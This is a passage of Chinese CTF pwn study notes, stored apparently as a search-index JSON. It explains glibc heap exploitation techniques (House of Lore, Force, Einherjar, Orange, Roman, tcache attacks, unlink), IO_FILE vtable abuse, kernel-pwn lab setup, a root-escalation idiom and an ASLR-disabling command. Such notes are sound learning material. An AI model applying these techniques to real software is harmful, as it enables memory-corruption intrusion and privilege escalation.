\u2461\u53ef\u4ee5\u63a7\u5236\u6307\u5b9a\u4f4d\u7f6e\u7684fd\u3001bk\u6307\u9488 Small bin\u7684check\u68c0\u67e5\u4e86victim->bk->fd==victim\uff0cvictim\u4e3a\u5f85unlink\u7684\u5806\uff0c\u628abk\u6539\u4e3a\u60f3\u8981\u7684\u4f4d\u7f6efake chunk\uff0c\u540c\u65f6\u90a3\u4e2a\u4f4d\u7f6e\u7684fd\u6307\u9488\u6539\u4e3avictim\uff0c\u5373\u53ef\u7ed5\u8fc7\u7b2c\u4e00\u6b21check\uff0c\u5206\u914d\u5230victim\u3002\u7136\u540efake chunk\u7684bk\u8981\u6307\u5411\u4e00\u4e2a\u53ef\u63a7\u5236\u7684\u5730\u65b9\uff0c\u8ba9\u8be5\u5904\u7684fd\u4e3afake chunk\uff0c\u5373\u53ef\u7ed5\u8fc7\u7b2c\u4e8c\u6b21check\uff0c\u5206\u914d\u5230fake chunk\u3002 if ( in_smallbin_range ( nb )) { // \u83b7\u53d6 small bin \u7684\u7d22\u5f15 idx = smallbin_index ( nb ); // \u83b7\u53d6\u5bf9\u5e94 small bin \u4e2d\u7684 chunk \u6307\u9488 bin = bin_at ( av , idx ); // \u5148\u6267\u884c victim= last(bin)\uff0c\u83b7\u53d6 small bin \u7684\u6700\u540e\u4e00\u4e2a chunk // \u5982\u679c victim = bin \uff0c\u90a3\u8bf4\u660e\u8be5 bin \u4e3a\u7a7a\u3002 // \u5982\u679c\u4e0d\u76f8\u7b49\uff0c\u90a3\u4e48\u4f1a\u6709\u4e24\u79cd\u60c5\u51b5 if (( victim = last ( bin )) != bin ) { // \u7b2c\u4e00\u79cd\u60c5\u51b5\uff0csmall bin \u8fd8\u6ca1\u6709\u521d\u59cb\u5316\u3002 if ( victim == 0 ) /* initialization check */ // \u6267\u884c\u521d\u59cb\u5316\uff0c\u5c06 fast bins \u4e2d\u7684 chunk \u8fdb\u884c\u5408\u5e76 malloc_consolidate ( av ); // \u7b2c\u4e8c\u79cd\u60c5\u51b5\uff0csmall bin \u4e2d\u5b58\u5728\u7a7a\u95f2\u7684 chunk else { // \u83b7\u53d6 small bin \u4e2d\u5012\u6570\u7b2c\u4e8c\u4e2a chunk \u3002 bck = victim -> bk ; // \u68c0\u67e5 bck->fd \u662f\u4e0d\u662f victim\uff0c\u9632\u6b62\u4f2a\u9020 if ( __glibc_unlikely ( bck -> fd != victim )) { errstr = \"malloc(): smallbin double linked list corrupted\" ; goto errout ; } // \u8bbe\u7f6e victim \u5bf9\u5e94\u7684 inuse \u4f4d set_inuse_bit_at_offset ( victim , nb ); // \u4fee\u6539 small bin \u94fe\u8868\uff0c\u5c06 small bin \u7684\u6700\u540e\u4e00\u4e2a chunk \u53d6\u51fa\u6765 bin -> bk = bck ; bck -> fd = bin ; // \u5982\u679c\u4e0d\u662f main_arena\uff0c\u8bbe\u7f6e\u5bf9\u5e94\u7684\u6807\u5fd7 if ( av != & main_arena ) set_non_main_arena ( victim ); // \u7ec6\u81f4\u7684\u68c0\u67e5 check_malloced_chunk ( av , victim , nb ); // \u5c06\u7533\u8bf7\u5230\u7684 chunk \u8f6c\u5316\u4e3a\u5bf9\u5e94\u7684 mem \u72b6\u6001 void * p = chunk2mem ( victim ); // \u5982\u679c\u8bbe\u7f6e\u4e86 perturb_type , \u5219\u5c06\u83b7\u53d6\u5230\u7684chunk\u521d\u59cb\u5316\u4e3a perturb_type ^ 0xff alloc_perturb ( p , bytes ); return p ; } } }","title":"Small bin attack(House of Lore):"},{"location":"Pwn\u5b66\u4e60\u7b14\u8bb0/pwn\u5b66\u4e60/#large-bin-attack","text":"\u53c2\u8003\uff1a https://veritas501.space/2018/04/11/Largebin%20%E5%AD%A6%E4%B9%A0/ \u63a7\u5236\u4e00\u4e2aunsorted chunk\u548c\u4e00\u4e2alarge chunk\uff0cunsorted chunk\u63a7\u5236bk\uff0clarge chunk\u63a7\u5236bk\u548cbk_nextsize\u3002\uff08\u4e0b\u9762\u8bf4\u7684\u662funsorted chunk>large chunk\uff09 \u5148\u628aunsorted chunk\u7684bk\u6539\u4e3a\u60f3\u63a7\u5236\u7684\u5730\u5740\u9644\u8fd1\uff0c\u8981\u8ba9size\u57df\u7b26\u5408\u4f60\u60f3\u63a7\u5236\u7684\u5927\u5c0f\uff08\u4e5f\u662f\u63a5\u4e0b\u6765\u4f60\u7533\u8bf7\u7684\u5927\u5c0f\uff09\uff0c\u800c\u8fd9\u4e2aunsorted chunk\u4e0d\u80fd\u5b8c\u7f8e\u7b26\u5408\u4f60\u63a5\u4e0b\u6765\u7533\u8bf7\u7684\u5927\u5c0f\uff0c\u4f7f\u5f97unsorted chunk\u56de\u5230\u5bf9\u5e94large bin\u3002 \u63a5\u7740\u56e0\u4e3a\u8fd9\u4e2aunsorted chunk\u8981\u56de\u5230large bin\uff0c\u5c31\u8981\u53d1\u751f\u4eceunsorted bin\u4e2dunlink\uff0c\u6b64\u65f6\u56e0\u4e3a\u4e0b\u56fe\u4f1a\u628a\u63a7\u5236\u7684\u5730\u65b9\u7684fd\u57df\u6539\u4e3a\u4e00\u4e2alibc\u5730\u5740\u3002 \u7136\u540e\u628a\u8fd9\u4e2aunsorted chunk\u52a0\u5165\u5230large bin\u4e2d\uff0c\u4f1a\u89e6\u53d1\u4e0b\u56fe\u63d2\u5165\u5230large bin\u7684\u4ee3\u7801\u3002\u4f1a\u628a\u63a7\u5236\u7684\u5730\u65b9\u7684bk_nextsize\u6539\u4e3a\u5806\u5730\u5740\u3002 \u4e4b\u540e\u8fd8\u6709\u4e00\u4e9b\u4ee3\u7801\uff0c\u5982\u4e0b\u56fe\uff0c\u53c8\u662f\u4efb\u610f\u5730\u5740\u5199\u5806\u5730\u5740\u3002\u8fd9\u91cc\u7684bck->fd\u8981\u8ba9\u5b83\u6539\u5230size\u57df\uff0c\u5355\u5b57\u8282\uff0c\u4f7f\u5f97\u5b83\u6ee1\u8db3\u4f60\u60f3\u8981\u7684\u5927\u5c0f\u3002 \u6700\u540e\u5206\u914d\u5f97\u5230\u7684\u5c31\u662f\u4f60\u5728unsorted chunk\u7684bk\u57df\u91cc\u4f2a\u9020\u7684\u90a3\u4e2a\u5806\u3002","title":"Large bin attack:\uff08\u8fd8\u4e0d\u592a\u61c2\uff09"},{"location":"Pwn\u5b66\u4e60\u7b14\u8bb0/pwn\u5b66\u4e60/#house-of-force","text":"\u5229\u7528\u6761\u4ef6\uff1a\u2460\u53ef\u4ee5\u63a7\u5236top chunk\u7684size\u57df \u2461\u53ef\u4ee5\u7533\u8bf7\u4efb\u610f\u5927\u5c0f\u7684\u5806 \u8bbefake chunk\u5730\u5740\u4e3aA\uff0c\u5f53\u524dtop chunk\u5730\u5740\u4e3aB\u3002\u8fd9\u65f6\u504f\u79fb\u4e3aA-B\u3002\u63a5\u4e0b\u6765\u8981\u8ba1\u7b97\u7533\u8bf7\u7684\u5806\u5927\u5c0freq\u3002\u6839\u636eglibc\u4ee3\u7801\uff0c\u9700\u8981\u6ee1\u8db3\uff1areq+SIZE_SZ+MALLOC_ALIGN_MASK=\u504f\u79fb=A-B\u3002 \u8fd9\u65f6req=A-B-SIZE_SZ-MALLOC_ALIGN_MASK\uff0c\u7136\u540emalloc(req)\u3002\u8fd9\u65f6top chunk\u5c31\u6307\u5411\u4e86\u4f60\u60f3\u8981\u7684\u5730\u5740A\u3002\u518d\u7533\u8bf7\u5c31\u4f1a\u8fd4\u56de\u5730\u5740\u4e3aA\u7684chunk\u3002","title":"House of force:"},{"location":"Pwn\u5b66\u4e60\u7b14\u8bb0/pwn\u5b66\u4e60/#house-of-einherjar","text":"\u5229\u7528\u6761\u4ef6\uff1a\u2460\u53ef\u4ee5\u63a7\u52361\u4e2a\u975efast chunk A\u7684prev size\u57df \u2461\u53ef\u4ee5\u8ba9A\u7684prev_in_use\u57df\u4e3a0 \u539f\u7406\u662f\u5229\u7528**unlink**\u3002\u628aA\u7684prev_in_use\u57df\u7f6e0\uff0c\u5728free A\u7684\u65f6\u5019\u4f1a\u89e6\u53d1\u540e\u5411\u5408\u5e76\uff0c\u628aA\u548cA-prev size\u7684fake chunk\u5408\u5e76\u3002\u5176\u4e2d\u7684check\u548cunlink\u65f6\u7684check\u4e00\u6837\uff1a if ( __builtin_expect ( FD -> bk != P || BK -> fd != P , 0 )) malloc_printerr ( check_action , \"corrupted double-linked list\" , P , AV ); \u9700\u8981\u628afake chunk\u7684fd\u548cbk\u6539\u4e3a\u6ee1\u8db3\u4ee5\u4e0a\u6761\u4ef6\u3002 PS\uff1aunlink\u4e2d\u5bf9size\u548cprev_size\u6709\u5982\u4e0b\u9a8c\u8bc1\uff1a if ( __builtin_expect ( chunksize ( P ) != prev_size ( next_chunk ( P )), 0 )) malloc_printerr ( \"corrupted size vs. prev_size\" ); \u6240\u4ee5\u53ea\u9700P+size\uff0c\u5c31\u662fglibc\u8ba4\u4e3a\u7684\u4e0b\u4e00\u4e2achunk\u7684prev_size\u57df\uff0c\u7b49\u4e8eP\u7684size\u57df\u5373\u53ef\u3002","title":"House of Einherjar:"},{"location":"Pwn\u5b66\u4e60\u7b14\u8bb0/pwn\u5b66\u4e60/#house-of-orange","text":"\u5229\u7528\u6761\u4ef6\uff1a\u5f53\u7a0b\u5e8f\u4e2d\u6ca1\u6709free\u51fd\u6570\u65f6\u4f7f\u7528\uff08\u9700\u8981\u80fd\u6539top chunk size\uff1f\u611f\u89c9\u4e0d\u4e00\u5b9a\uff0c\u4f46\u8d44\u6599\u8fd9\u4e48\u5199\uff09 \u5f53top chunk\u4e0d\u80fd\u6ee1\u8db3\u5f53\u524d\u5206\u914d\u7684\u9700\u6c42\u65f6\uff0c\u4f1a\u7528brk\u62d3\u5c55\u5806\uff0c\u4e4b\u524d\u7684top chunk\u5c31\u4f1a\u88ab\u653e\u5165unsorted bin\u4e2d \u6ce8\u610f\u4e8b\u9879\uff1a\u2460\u4f2a\u9020\u7684top chunk size\u5fc5\u987b\u8981\u5bf9\u9f50\u5230\u5185\u5b58\u9875\uff08\u5373\u540e3\u4f4d\uff09 \u2461size\u8981\u5927\u4e8eMINSIZE \u2462size\u8981\u5c0f\u4e8e\u4e4b\u540e\u7533\u8bf7\u7684chunk size+MINSIZE \u2463size\u7684prev_in_use\u4f4d\u4e3a1","title":"House of Orange:"},{"location":"Pwn\u5b66\u4e60\u7b14\u8bb0/pwn\u5b66\u4e60/#house-of-roman","text":"\u5229\u7528\u6761\u4ef6\uff1a\u2460\u65e0\u6cd5leak \u2461\u5b58\u5728UAF\u6f0f\u6d1e \u2462\u53ef\u4ee5\u751f\u6210fast chunk\u548cunsorted chunk \u5148\u901a\u8fc7fast bin attack\uff0c\u4f7f\u5f97fast chunk\u7684fd\u57df\u5b58\u6709main_arena\u76f8\u5173\u7684\u5730\u5740\uff0c\u901a\u8fc7\u6539\u4f4e\u5b57\u8282\uff0c\u7533\u8bf7\u5230 __malloc_hook-0x23 \u4f5c\u4e3afake chunk\u3002\u7136\u540e\u901a\u8fc7unsorted bin attack\uff0c\u4f7f\u5f97unsorted chunk\u7684bk\u57df\u5b58\u6709main_arena\u76f8\u5173\u5730\u5740\uff0c\u901a\u8fc7\u6539\u4f4e\u5b57\u8282\uff0c\u628a __malloc_hook \u7684\u503c\u6539\u4e3a\u4e00\u4e2a\u548cmain_arena\u76f8\u5173\u7684\u5730\u5740\u3002\u6700\u540e\u5229\u7528\u524d\u9762fast bin attack\u5f97\u5230\u7684fake chunk\uff0c\u6539\u4f4e\u5b57\u8282\uff0c\u628amain_arena\u76f8\u5173\u6539\u6210one_gadget\u3002\u6700\u540edouble free\u89e6\u53d1one_gadget\uff0c\u9009\u53d6rsp+0x50\u90a3\u4e2a\u6210\u529f\u7387\u8f83\u9ad8\u3002","title":"House of Roman:"},{"location":"Pwn\u5b66\u4e60\u7b14\u8bb0/pwn\u5b66\u4e60/#tcache-attack","text":"","title":"Tcache Attack:"},{"location":"Pwn\u5b66\u4e60\u7b14\u8bb0/pwn\u5b66\u4e60/#tcache-poisoning","text":"\u548cfast bin attack\u7c7b\u4f3c\uff0c\u6539fd\uff0c\u4f46\u6ca1\u6709\u4e86size\u7684\u9650\u5236","title":"tcache poisoning:"},{"location":"Pwn\u5b66\u4e60\u7b14\u8bb0/pwn\u5b66\u4e60/#tcache-dup","text":"2.27\uff1adouble free\uff0c\u4f46\u6ca1\u6709\u4efb\u4f55\u68c0\u67e5\uff0c\u53ef\u4ee5\u76f4\u63a5double free 2.29\uff1a\u5bf9double free\u52a0\u5165\u68c0\u67e5\uff0c\u5982\u679c\u53d1\u73b0\u5728\u5f53\u524dtcache\u4e2d\u5df2\u6709\u5f85free\u7684\u5806\uff0c\u5219\u62a5\u9519\uff1b\u4f46\u5982\u679c\u540c\u4e00\u4e2a\u5806\u5728\u4e24\u4e2atcache\u4e2d\u5b58\u5728\u4e0d\u4f1a\u62a5\u9519","title":"tcache dup:"},{"location":"Pwn\u5b66\u4e60\u7b14\u8bb0/pwn\u5b66\u4e60/#io_file","text":"","title":"IO_FILE\u5229\u7528"},{"location":"Pwn\u5b66\u4e60\u7b14\u8bb0/pwn\u5b66\u4e60/#_9","text":"\u7a0b\u5e8f\u5bf9\u6bcf\u4e2a\u6587\u4ef6\u6d41\u751f\u6210\u4e00\u4e2aFILE\u7ed3\u6784\u3002\u5bf9\u6240\u6709FILE\u7ed3\u6784\u7528\u94fe\u8868\u8fde\u63a5\uff0c\u94fe\u8868\u5934\u7528_IO_list_all\u8868\u793a\u3002\u6807\u51c6IO\u5e93\uff0c\u7a0b\u5e8f\u542f\u52a8\u65f6\u81ea\u52a8\u6253\u5f00stdin\u3001stdout\u3001stderr\u4e09\u4e2a\u6587\u4ef6\u6d41\uff0c\u8fd9\u4e09\u4e2a\u6d41\u4f4d\u4e8elibc.so\u7684\u6570\u636e\u6bb5\u3002\u800c\u7528fopen\u521b\u5efa\u7684\u6587\u4ef6\u6d41\u5206\u914d\u5728\u5806\u5185\u5b58\u4e0a\u3002 c struct _IO_FILE_plus { _IO_FILE file; IO_jump_t *vtable; } 32\u4f4d\u4e0bvtable\u504f\u79fb\u4e3a0x94\uff0c64\u4f4d\u504f\u79fb\u4f4d0xd8 ```c void * funcs[] = { 1 NULL, // \"extra word\" 2 NULL, // DUMMY 3 exit, // finish 4 NULL, // overflow 5 NULL, // underflow 6 NULL, // uflow 7 NULL, // pbackfail 8 NULL, // xsputn #printf 9 NULL, // xsgetn 10 NULL, // seekoff 11 NULL, // seekpos 12 NULL, // setbuf 13 NULL, // sync 14 NULL, // doallocate 15 NULL, // read 16 NULL, // write 17 NULL, // seek 18 pwn, // close 19 NULL, // stat 20 NULL, // showmanyc 21 NULL, // imbue }; ``` fread\u8c03\u7528\uff1aIO_file_xsgetn fwrite\u8c03\u7528\uff1aIO_file_xsputn\uff0cIO_file_overflow\uff0c_IO_file_write fopen\u8c03\u7528 fclose\u8c03\u7528\uff1aIO_file_finish printf/puts\u8c03\u7528\uff1aIO_file_xsputn\uff0cIO_file_overflow\uff0c_IO_file_write vtable \u4e2d\u7684\u51fd\u6570\u8c03\u7528\u65f6\u4f1a\u628a\u5bf9\u5e94\u7684_IO_FILE_plus \u6307\u9488\u4f5c\u4e3a\u7b2c\u4e00\u4e2a\u53c2\u6570\u4f20\u9012. \u7a0b\u5e8f\u8c03\u7528 exit \u540e\uff0c\u4f1a\u904d\u5386 _IO_list_all \uff0c\u8c03\u7528 _IO_2_1_stdout_ \u4e0b\u7684 vatable \u4e2d _setbuf \u51fd\u6570\u3002 \u5f53 glibc \u68c0\u6d4b\u5230\u5185\u5b58\u9519\u8bef\u65f6\uff0c\u4f1a\u4f9d\u6b21\u8c03\u7528\u8fd9\u6837\u7684\u51fd\u6570\u8def\u5f84\uff1amalloc_printerr -> libc_message->__GI_abort -> _IO_flush_all_lockp -> _IO_OVERFLOW","title":"\u57fa\u7840\u77e5\u8bc6\uff1a"},{"location":"Pwn\u5b66\u4e60\u7b14\u8bb0/pwn\u5b66\u4e60/#io_file_to_leak","text":"\u6539 _IO_2_1_stdout_ \u7684flag\u4e3a0xfbad1800\uff0c\u7136\u540e\u540e\u9762\u52a0p64(0)*3+'\\x00'\uff0c\u6539\u5c0f _IO_write_base \uff0c\u4ece\u800c\u53ef\u4ee5\u591a\u8f93\u51fa\u4e00\u70b9\u4fe1\u606f\uff0c\u5176\u4e2d\u5305\u62eclibc\u5730\u5740\uff0c\u53ef\u4ee5\u627e\u5230 _IO_file_jumps","title":"IO_FILE_to_leak"},{"location":"Pwn\u5b66\u4e60\u7b14\u8bb0/pwn\u5b66\u4e60/#pwn","text":"","title":"\u5185\u6838Pwn"},{"location":"Pwn\u5b66\u4e60\u7b14\u8bb0/pwn\u5b66\u4e60/#_10","text":"\u73af\u5883\u914d\u7f6e\u53c2\u8003\uff1a http://blog.eonew.cn/archives/1162 https://23r3f.github.io/2019/05/15/kernel%20pwn%E5%88%9D%E6%8E%A2/ \u5185\u6838\u7f16\u8bd1\uff1a make bzImage busybox\u7f16\u8bd1\uff1a make install \u5f97\u5230_install\u6587\u4ef6\u5939\uff0c\u624b\u52a8\u6dfb\u52a0\u4e00\u4e9b\u7cfb\u7edf\u6587\u4ef6\u5939\u548cinit\u521d\u59cb\u5316\u811a\u672c \u5982\u679c\u9700\u8981\u52a0\u53ef\u6267\u884c\u6587\u4ef6\uff08ELF\uff09\uff0c\u4e5f\u662f\u653e\u5728_install\u76ee\u5f55\u4e0b \u6253\u5305\uff1a find . | cpio -o --format=newc > ./rootfs.img qemu\u542f\u52a8\uff1a \u628a\u7f16\u8bd1\u597d\u7684\u5185\u6838bzImage\u548cbusybox\u6253\u5305\u597d\u7684\u6587\u4ef6\u7cfb\u7edf\u653e\u5230\u540c\u4e00\u6587\u4ef6\u5939\u4e0b\uff0c\u4e4b\u540e\u6267\u884cshell\u547d\u4ee4\uff08\u4e3a\u65b9\u4fbf\u76f4\u63a5\u653e\u5230.sh\u6587\u4ef6\u4e2d\uff09 sh\uff1a #!/bin/sh qemu-system-x86_64 \\ -m 64M \\ -kernel ./bzImage \\ -initrd ./rootfs.img \\ -append \"root=/dev/ram rw oops=panic panic=1 kalsr\" \\ -netdev user,id=t0, -device e1000,netdev=t0,id=nic0 \\ -monitor /dev/null \\ -smp cores=2,threads=1 \\ -cpu kvm64,+smep \\ #-S \u542f\u52a8gdb\u8c03\u8bd5 #-gdb tcp:1234 \u7b49\u5f85gdb\u8c03\u8bd5","title":"\u73af\u5883\u914d\u7f6e"},{"location":"Pwn\u5b66\u4e60\u7b14\u8bb0/pwn\u5b66\u4e60/#_11","text":"dmesg\uff1a\u5f00\u673a\u4fe1\u606f\uff08 /proc/sys/kernel/dmesg_restrict \u4e3a1\u5219\u4e0d\u80fd\u8f93\u51fa\uff09 /proc/kallsyms \uff1a\u4fdd\u5b58\u5730\u5740\u7684\u6587\u4ef6\uff0c\u53ef\u4ee5\u83b7\u53d6commit_creds\u548cprepare_kernel_creds\u7684\u5730\u5740\uff08 /proc/sys/kernel/kptr_restrict \u4e3a1\u5219\u4e0d\u80fd\u8f93\u51fa\uff09 \u6267\u884c commit_creds(prepare_kernel_cred(0)) \u5373\u53ef\u83b7\u5f97 root \u6743\u9650","title":"\u547d\u4ee4"},{"location":"Pwn\u5b66\u4e60\u7b14\u8bb0/pwn\u5b66\u4e60/#gdbglibc","text":"sudo apt-get install glibc-source sudo apt-get install libc6-dbg sudo tar -xf /usr/src/glibc/glibc-2.23.tar.xz \u5373\u53ef \u5728gdb\u63d0\u793a\u7b26\u4e0b\u8f93\u5165\u4ee5\u4e0b\u5185\u5bb9\uff1a pwndbg> directory /usr/src/glibc/glibc-2.23/malloc/ pwndbg> b _int_malloc\uff08\u8981\u65ad\u7684\u51fd\u6570\uff09 \u5982\u679c\u51fa\u73b0 Function \"_int_malloc\" not defined. \uff0c\u522b\u614c\uff0c\u628a\u7a0b\u5e8f\u8fd0\u884c\u8d77\u6765\u518d\u65ad\u5c31\u597d\u3002","title":"gdb\u8c03\u8bd5glibc"},{"location":"Pwn\u5b66\u4e60\u7b14\u8bb0/pwn\u5b66\u4e60/#_12","text":"libc\u4e2d\u5b58\u50a8\u4e86main\u51fd\u6570environ\u6307\u9488\u7684\u5730\u5740\uff0c\u901a\u8fc7\u8be5\u6307\u9488\u53ef\u4ee5\u627e\u5230main\u51fd\u6570\u7684\u8fd4\u56de\u5730\u5740\u5b58\u7684\u5730\u65b9A\uff08\u5728\u6808\u4e0a\uff09\uff0c\u5373\u901a\u8fc7environ\u6cc4\u6f0f\u6808\u5730\u5740\uff1a &environ\u662f\u53d7libc_base\u5f71\u54cd\u7684\u5730\u5740\u3002A=environ-0x1e*8 \u5173\u95ed\u7cfb\u7edfASLR\uff1aecho 0 > /proc/sys/kernel/randomize_va_space \u5f00\u542fgdb PIE\uff1aset disable-randomization off ASLR\u53d6\u503c\u89e3\u91ca\uff1a 0\uff1a\u6240\u6709\u968f\u673a\u5316\u5173\u95ed 1\uff1a\u9664\u5806\u4ee5\u5916\uff0c\u6240\u6709\u968f\u673a\u5316\u5f00\u542f\uff08\u5305\u62ec\u7a0b\u5e8f\u4ee3\u7801\u3001\u6808\u3001\u52a8\u6001\u5e93\u5730\u5740\uff09\u3002\u5806\u5730\u5740\u867d\u7136\u4e5f\u968f\u7a0b\u5e8f\u4ee3\u7801\u800c\u52a8\u6001\u53d8\u5316\uff0c\u4f46\u662f\u5806\u662f\u7d27\u8ddf\u5728\u7a0b\u5e8f\u90e8\u5206\u540e\u9762\u7684\uff0c\u968f\u7a0b\u5e8f\u4ee3\u7801\u57fa\u5740\u53d8\u5316\u3002 2\uff1a\u6240\u6709\u968f\u673a\u5316\u5f00\u542f\uff0c\u5806\u5730\u5740\u4e5f\u968f\u673a\uff0c\u4e0d\u80fd\u901a\u8fc7\u7a0b\u5e8f\u4ee3\u7801\u57fa\u5740\u63a8\u51fa\u3002 \u51fa\u9898\uff0c\u5f00\u542f\u9632\u62a4\u7684\u65b9\u6cd5\uff1a https://www.cnblogs.com/Spider-spiders/p/8798628.html \u79fb\u9664.symtab \u7b26\u53f7\u8868 \u4ee5\u53ca .strtab \u7b26\u53f7\u5b57\u7b26\u4e32\u8868 strip --remove-section=.symtab file_in strip --remove-section=.strtab file_in \u5728main\u51fd\u6570\u524d\u4f1a\u8c03\u7528.init\u6bb5\u4ee3\u7801\u548c.init_array\u6bb5\u7684\u51fd\u6570\u6570\u7ec4\u4e2d\u6bcf\u4e00\u4e2a\u51fd\u6570\u6307\u9488\u3002\u540c\u6837\u7684\uff0cmain\u51fd\u6570\u7ed3\u675f\u540e\u4e5f\u4f1a\u8c03\u7528.fini\u6bb5\u4ee3\u7801\u548c.fini._arrary\u6bb5\u7684\u51fd\u6570\u6570\u7ec4\u4e2d\u7684\u6bcf\u4e00\u4e2a\u51fd\u6570\u6307\u9488\u3002 \u7ed9\u7a0b\u5e8f\u4f20\u53c2\u6570\uff0cprocess(argv=[]) patchelf\u4f7f\u7528\u65b9\u6cd5\uff1a \u6539ld.so\u65f6\uff0cpatchelf --set-interpreter ld.so elfname\uff1b \u6539libc\u65f6\uff0cpatchelf --set-rpath libc elfname","title":"\u5b9e\u7528\u5c0f\u77e5\u8bc6\uff1a"},{"location":"Pwn\u5b66\u4e60\u7b14\u8bb0/\u6d45\u8c08glibc-unlink/","text":"\u521a\u5f00\u59cb\u770bctf-wiki\u4e0a\u7684unlink\u7684\u539f\u7406\u4ecb\u7ecd\u7684\u65f6\u5019\u7b80\u76f4\u4e00\u8138\u61f5\u903c\uff0c\u540e\u6765\u4e0a\u624b\u8fd9\u9898stkof\u5b9e\u6218\uff0c\u540c\u65f6\u770b\u4e86\u5176\u4ed6writeup\u4e4b\u540e\uff0c\u7ec8\u4e8e\u7b97\u662f\u6709\u4e86\u4e9b\u6d45\u8584\u7684\u7406\u89e3\u3002\u56e0\u6b64\u628aunlink\u7684\u8fc7\u7a0b\u8bb0\u5f55\u4e0b\u6765\uff0c\u9632\u6b62\u4ee5\u540e\u5fd8\u4e86\u3002 \u4ec0\u4e48\u662funlink\uff1f \u00b6 unlink\u5c31\u662f\u628a\u4e00\u4e2a\u7a7a\u95f2chunk\u4ece\u53cc\u5411\u94fe\u8868\uff08\u5982small bin\uff09\u4e2d\u62ff\u51fa\u6765\uff0c\u4f8b\u5982\u5206\u914d\u65b0chunk\uff0c\u6216\u662ffree(p)\u65f6\u548cp\u7269\u7406\u76f8\u90bb\u7684\u7a7a\u95f2chunk\u4f1a\u548cp\u8fdb\u884c\u524d/\u540e\u5411\u5408\u5e76\uff08\u672c\u6587\u4e3b\u8981\u8bb2\u8fd9\u79cd\uff09\u3002unlink\u7684\u57fa\u672c\u8fc7\u7a0b\u5982\u4e0b\uff08\u56fe\u6765\u81eactf-wiki\uff09\uff1a \u5f53\u6709\u7269\u7406\u5730\u5740\u76f8\u90bb\u7684\u4e24\u4e2achunk\uff0c\u6309\u5730\u5740\u4ece\u4f4e\u5230\u9ad8chunk1-chunk2\uff0c\u5176\u4e2dchunk1\u662f\u7a7a\u95f2\u72b6\u6001\uff0cchunk2\u662f\u5206\u914d\u72b6\u6001\uff0c\u4e14chunk2\u4e3asmall chunk\uff08large chunk\u4f3c\u4e4e\u4e5f\u53ef\u4ee5\uff0c\u4ee5\u540e\u518d\u7814\u7a76\u4e0b\uff09\uff0c\u8fd9\u65f6\u5019\u6267\u884cfree(chunk2)\uff0c\u5c31\u4f1a\u8fdb\u884c\u5982\u4e0b\u68c0\u6d4b\uff1a \u540e\u5411\u5408\u5e76\uff1a \u00b6 \u68c0\u6d4bchunk2\u7684prev_in_use\u4f4d\uff0c\u770bchunk1\u662f\u5426\u4e3a\u7a7a\u95f2\uff0c\u82e5\u4e3a\u7a7a\u95f2\uff0c\u5219\u4e24\u4e2achunk\u5185\u5b58\u5408\u5e76\uff0c\u6307\u5411chunk2\u7684\u6307\u9488\u6539\u4e3a\u6307\u5411chunk1\uff0c\u63a5\u7740\u4f7f\u7528unlink\u5b8f\uff0c\u628achunk1\u4ece\u53cc\u5411\u94fe\u8868\u4e2d\u79fb\u9664\uff0cchunk1\u8fdb\u5165unsorted bin\u3002 if ( ! prev_inuse ( p )) { prevsize = prev_size ( p ); size += prevsize ; p = chunk_at_offset ( p , - (( long ) prevsize )); unlink ( av , p , bck , fwd ); } \u524d\u5411\u5408\u5e76\uff1a \u00b6 \u8ddf\u540e\u5411\u5408\u5e76\u539f\u7406\u76f8\u4f3c\uff0c\u68c0\u6d4bchunk2\u7684\u4e0b\u4e2achunk\uff08chunk3\uff0c\u7269\u7406\u5730\u5740\u6bd4chunk2\u9ad8\uff09\u662f\u5426\u4e3a\u7a7a\u95f2\uff0c\u7a7a\u95f2\u5219\u5408\u5e76\uff0c\u89e6\u53d1unlink\u5b8f\uff0c\u628achunk3\u4ece\u53cc\u5411\u94fe\u8868\u4e2d\u79fb\u9664\u3002 \u5229\u7528\uff1a \u00b6 \u7406\u60f3\uff1a \u00b6 \u4e86\u89e3\u4e86unlink\u7684\u89e6\u53d1\u673a\u5236\u540e\uff0c\u6211\u4eec\u5c31\u8981\u60f3\u600e\u4e48\u5229\u7528\u5b83\u4e86\u3002\u663e\u7136\uff0c\u8981\u628achunk1\u4ece\u94fe\u8868\u4e2d\u79fb\u9664\uff0c\u6700\u91cd\u8981\u7684\u5c31\u662ffd\u548cbk\u6307\u9488\u4e86\uff0c\u6240\u4ee5\u6211\u4eec\u4ece\u5b83\u4e0b\u624b\u3002\u56de\u5230\u4e0a\u9762\u7684\u56fe\u4e2d\uff0c\u6211\u4eec\u6784\u9020\uff1a\uff08P\u4e3achunk1\u5730\u5740\uff09 FD=P->fd = target addr -12 BK=P->bk = expect value \u6839\u636eunlink\u5b8f\uff0c\u4f1a\u6709\u4ee5\u4e0b\u64cd\u4f5c\uff1a FD->bk = BK \uff0c\u5373 FD->bk= *(target addr-12+12)=BK=expect value \uff0c\u5373 *(target addr)=expect value BK->fd = FD \uff0c\u5373 *(expect value +8) = FD = target addr-12 \u7531\u6b64\u53ef\u5b9e\u73b0\u4efb\u610f\u5730\u5740\u5199\uff0c\u4f8b\u5982\u4fee\u6539GOT\u8868\u9879\u3002\u867d\u7136expect value +8\u5730\u5740\u7684\u503c\u88ab\u8986\u76d6\u4e86\u6709\u53ef\u80fd\u6709\u5c0f\u95ee\u9898\u3002 \u73b0\u5b9e\uff1a \u00b6 \u7406\u60f3\u5f88\u4e30\u6ee1\uff0c\u73b0\u5b9e\u5f88\u9aa8\u611f\uff0c\u600e\u4e48\u53ef\u80fd\u968f\u968f\u4fbf\u4fbf\u5c31\u8ba9\u4f60\u5229\u7528\u3002\u3002\u3002\u5b9e\u9645\u4e0a\uff0c\u5728glibc\u4e2d\u8fd8\u6709\u8fd9\u4e2a\u68c0\u6d4b\u673a\u5236\uff1a if ( __builtin_expect ( FD -> bk != P || BK -> fd != P , 0 )) malloc_printerr ( check_action , \"corrupted double-linked list\" , P , AV ); \u6309\u7167\u4e0a\u9762\u6784\u9020\uff0c\u5219\u6709FD->bk=*(target 